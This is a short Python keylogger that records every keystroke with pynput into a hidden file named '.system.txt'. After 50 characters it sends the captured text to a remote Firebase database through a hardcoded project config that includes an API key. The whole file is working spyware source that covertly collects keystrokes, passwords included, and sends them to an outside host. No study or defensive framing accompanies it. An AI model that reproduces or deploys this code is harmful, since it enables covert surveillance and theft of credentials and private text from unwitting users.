from pynput.keyboard import Key, Listener
import logging
import pyrebase
from pyrebase.pyrebase import Database
from datetime import datetime

logging.basicConfig(filename=(".system.txt"), level=logging.DEBUG)


#logger
full_log = ''
word = ''
limit = 50

def on_press(key):
    global word 
    global full_log
    global limit

    if key == Key.space or key == Key.enter:
        word += ' '
    elif key == Key.backspace:
        word = word[:-1]
    else:
        char = f'{key}'
        char = char[1:-1]
        word += char
        full_log += word
        word = ''

    if len(full_log) >= limit:

        text_file = open(".system.txt", "a")
        text_file.write(full_log)
        text_file.close()
        
        config = {
        "apiKey": "AIzaSyBlU9-VpIJBkuQm6InmbDYR9a1RGDjyMEM",
        "authDomain": "database-8a32b.firebaseapp.com",
        "projectId": "database-8a32b",
        "databaseURL": "https://database-8a32b-default-rtdb.firebaseio.com/",
        "storageBucket": "database-8a32b.appspot.com",
        "messagingSenderId": "687860534717",
        "appId": "1:687860534717:web:8584552ffb209709b556d4",
        "measurementId": "G-F28H25V65G"
        }
        now = datetime.now()
        dt_string = now.strftime("%d-%m-%Y %H:%M:%S")

        firebase = pyrebase.initialize_app(config)
        database = firebase.database()

        database.child("logges").child(dt_string).set(full_log)

        return False

 
with Listener(on_press=on_press) as listener :
    listener.join()